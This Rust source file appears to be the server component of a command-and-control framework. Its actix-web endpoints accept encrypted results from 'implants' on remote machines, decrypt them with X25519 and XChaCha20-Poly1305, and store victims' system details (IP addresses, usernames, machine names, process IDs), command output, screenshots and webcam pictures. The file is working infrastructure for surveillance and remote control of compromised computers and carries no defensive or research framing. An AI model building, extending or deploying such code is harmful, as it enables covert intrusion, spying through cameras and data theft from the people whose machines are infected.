use actix_web::{get, post, web, HttpResponse, Responder};
use arrayvec::ArrayVec;
use base64;
use chrono;
use diesel::prelude::*;
use repng;
use std::fs::File;
use std::io::Write;
use std::str::FromStr;
use uuid;
use x25519_dalek::{PublicKey, StaticSecret};

use crate::db::connect::Pool;
use crate::errors::ServerError;
use crate::models::implant::{Implant, SystemInfo};
use crate::models::plain_result::PlainResult;
use crate::models::screenshot::ScreenshotResponse;
use crate::models::task::{Task, Tasks};
use crate::utils::{network_encryption, shell};

#[post("/api/result/{task_id}")]
pub async fn post_task(
    db: web::Data<Pool>,
    path: web::Path<String>,
    base64_req_body: String,
) -> Result<impl Responder, ServerError> {
    let result_created_at = chrono::Local::now().naive_local();

    let task_id = path.into_inner();

    let mut base64_req_body_lines = base64_req_body.lines();

    // Using unwrap is safe here, because we control the response from server
    // and it is known to the creator
    let base64_result_str = base64_req_body_lines.next().unwrap();
    let base64_nonce_str = base64_req_body_lines.next().unwrap();
    let implant_id = base64_req_body_lines.next().unwrap();

    let base64_result = base64_result_str.clone().to_owned();
    let base64_nonce = base64_nonce_str.clone().to_owned();

    // Find and update task in tasks table
    let db_clone = db.clone();
    let base64_result_clone = base64_result.clone();
    let base64_nonce_clone = base64_nonce.clone();
    let task_id_clone = task_id.clone();
    web::block(move || {
        update_task(
            db_clone,
            base64_result_clone,
            base64_nonce_clone,
            result_created_at,
            task_id_clone,
        )
    })
    .await??;

    // Get server private key and implant public key from db, using implant_id
    let implant_id = uuid::Uuid::from_str(implant_id)?;
    let db_clone = db.clone();

    let (server_private_key, public_key) =
        web::block(move || get_implant_data_from_db(db_clone, implant_id)).await??;

    // Decrypt encrypted response
    let base64_result_clone = base64_result.clone();
    let base64_nonce_clone = base64_nonce.clone();
    let decrypted_response = decrypt_response(
        base64_result_clone,
        base64_nonce_clone,
        server_private_key,
        public_key,
    )?;

    //& Get task from db
    let db_clone = db.clone();
    let task_id_clone = task_id.clone();
    let task = web::block(move || get_task_from_db(db_clone, task_id_clone)).await??;

    // Using unwrap is safe here because task is fetched from db
    let task_enum = Tasks::from_str(task.task.as_str()).unwrap();

    // Check task type and according to that run correct arm
    match task_enum {
        Tasks::GetInfo => {
            let deserialized_response: SystemInfo = bincode::deserialize(&decrypted_response[..])?;

            // Find and update implant in implants table
            web::block(move || update_implant(db, deserialized_response)).await??;
        }
        Tasks::Command => {
            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;

            // Save in plain_results table
            web::block(move || add_plain_result(db, task.task_id, deserialized_response, None))
                .await??;
        }
        Tasks::ChangeCheckIn => {
            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;

            // Save in plain_results table
            web::block(move || add_plain_result(db, task.task_id, deserialized_response, None))
                .await??;
        }
        Tasks::TakeScreenshot => {
            let deserialized_response: ScreenshotResponse =
                bincode::deserialize(&decrypted_response[..])?;

            repng::encode(
                File::create(format!("assets/{}.png", task.task_id.to_string()))?,
                deserialized_response.width,
                deserialized_response.height,
                &deserialized_response.bitflipped_bytes,
            )?;

            // Save in plain_results table
            web::block(move || {
                add_plain_result(
                    db,
                    task.task_id,
                    deserialized_response.bitflipped_bytes,
                    Some(format!("{}.png", task.task_id.to_string())),
                )
            })
            .await??;
        }
        Tasks::TakePicture => {
            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;

            // Save bytes as task_id.yuv
            let mut file = File::create(format!("assets/{}.yuv", task.task_id.to_string()))?;
            file.write_all(&deserialized_response)?;

            // Save image as png
            shell::execute_command(format!("ffmpeg -s 640x480 -pix_fmt yuyv422 -i assets/{}.yuv -f image2 -pix_fmt rgb24 assets/{}.png", task.task_id.to_string(), task.task_id.to_string()))?;

            // Save in plain_results table
            web::block(move || {
                add_plain_result(
                    db,
                    task.task_id,
                    deserialized_response,
                    Some(format!("{}.png", task.task_id.to_string())),
                )
            })
            .await??;
        }
        _ => unimplemented!(),
    }

    Ok(HttpResponse::Ok().finish())
}

#[get("/plain_result/{task_id}")]
pub async fn get_plain_result(
    db: web::Data<Pool>,
    path: web::Path<String>,
) -> Result<impl Responder, ServerError> {
    let task_id = path.into_inner();

    // Get only plain_result from db that belongs to received task_id
    let plain_result = web::block(move || get_plain_result_from_db(db, task_id)).await??;

    if plain_result.is_empty() {
        Ok(HttpResponse::Ok().body("wait"))
    } else {
        Ok(HttpResponse::Ok().json(plain_result[0].clone()))
    }
}

fn get_plain_result_from_db(
    db: web::Data<Pool>,
    task_id: String,
) -> Result<Vec<PlainResult>, ServerError> {
    use crate::schema::tasks::dsl::tasks;

    let conn = db.get()?;

    let task_id = uuid::Uuid::parse_str(&task_id)?;

    let task = tasks.find(task_id).get_result::<Task>(&conn)?;

    let plain_result_vec = PlainResult::belonging_to(&task)
        .limit(1)
        .load::<PlainResult>(&conn)?;

    Ok(plain_result_vec)
}

fn update_task(
    db: web::Data<Pool>,
    base64_result: String,
    base64_nonce: String,
    result_created_at_arg: chrono::NaiveDateTime,
    task_id: String,
) -> Result<(), ServerError> {
    use crate::schema::tasks::dsl::{
        result_content, result_created_at, result_nonce, task_status, tasks,
    };

    let conn = db.get()?;

    let task_id = uuid::Uuid::from_str(&task_id)?;

    let target = tasks.find(task_id);

    diesel::dsl::update(target)
        .set((
            result_content.eq(base64_result),
            result_nonce.eq(base64_nonce),
            result_created_at.eq(result_created_at_arg),
            task_status.eq("completed".to_owned()),
        ))
        .execute(&conn)?;

    Ok(())
}

fn get_implant_data_from_db(
    db: web::Data<Pool>,
    implant_id: uuid::Uuid,
) -> Result<(String, String), ServerError> {
    use crate::schema::implants::dsl::implants;

    let conn = db.get()?;

    let target: Implant = implants.find(implant_id).first(&conn)?;

    Ok((target.server_private_key, target.public_key))
}

fn get_task_from_db(db: web::Data<Pool>, task_id: String) -> Result<Task, ServerError> {
    use crate::schema::tasks::dsl::tasks;

    let conn = db.get()?;

    let task_id = uuid::Uuid::from_str(&task_id)?;

    let target: Task = tasks.find(task_id).first(&conn)?;

    Ok(target)
}

fn decrypt_response(
    base64_result: String,
    base64_nonce: String,
    base64_server_private_key: String,
    base64_public_key: String,
) -> Result<Vec<u8>, ServerError> {
    // Convert and decrypt tasks response
    // Base64 decode
    let decoded_encrypted_result = base64::decode(base64_result)?;

    // Convert private key and public key from base64 to [u8, 32] and nonce from base64 to [u8; 24]
    let server_private_key_vec = base64::decode(base64_server_private_key)?;
    let server_private_key_bytes: ArrayVec<u8, 32> = server_private_key_vec.into_iter().collect();
    let server_private_key_bytes = server_private_key_bytes.into_inner()?;

    let public_key_vec = base64::decode(base64_public_key)?;
    let public_key_bytes: ArrayVec<u8, 32> = public_key_vec.into_iter().collect();
    let public_key_bytes = public_key_bytes.into_inner()?;

    let nonce_vec = base64::decode(base64_nonce)?;
    let nonce_bytes: ArrayVec<u8, 24> = nonce_vec.into_iter().collect();
    let nonce_bytes = nonce_bytes.into_inner()?;

    // Generate x25519 shared secret
    let public_key = PublicKey::from(public_key_bytes);
    let private_key = StaticSecret::from(server_private_key_bytes);
    let x25519_shared_secret = network_encryption::generate_shared_secret(private_key, public_key);

    // Generate BLAKE3 hashed key
    let blake3_hashed_key = network_encryption::blake3_hash_key(x25519_shared_secret.as_bytes());

    // Decrypt tasks response
    let decrypted_tasks_response = network_encryption::xchacha20poly1305_decrypt_message(
        blake3_hashed_key,
        decoded_encrypted_result,
        nonce_bytes,
    );

    Ok(decrypted_tasks_response)
}

fn update_implant(db: web::Data<Pool>, system_info: SystemInfo) -> Result<(), ServerError> {
    use crate::schema::implants::dsl::{
        architecture, external_ip_address, implants, internal_ip_address, machine_name,
        machine_user, os_type, pid, process_name,
    };

    let conn = db.get()?;

    let implant_id_converted = uuid::Uuid::from_str(system_info.implant_id.as_str())?;

    let target = implants.find(implant_id_converted);

    diesel::dsl::update(target)
        .set((
            external_ip_address.eq(system_info.external_ip_address),
            internal_ip_address.eq(system_info.internal_ip_address),
            os_type.eq(system_info.os_type),
            machine_user.eq(system_info.machine_user),
            machine_name.eq(system_info.machine_name),
            process_name.eq(system_info.process_name),
            pid.eq(system_info.pid),
            architecture.eq(system_info.architecture),
        ))
        .execute(&conn)?;

    Ok(())
}

fn add_plain_result(
    db: web::Data<Pool>,
    task_id: uuid::Uuid,
    deserialized_response: Vec<u8>,
    image_url: Option<String>,
) -> Result<(), ServerError> {
    use crate::schema::plain_results::dsl::plain_results;

    let conn = db.get()?;

    let plain_result = PlainResult::new(deserialized_response, image_url, task_id);

    diesel::dsl::insert_into(plain_results)
        .values(&plain_result)
        .execute(&conn)?;

    Ok(())
}
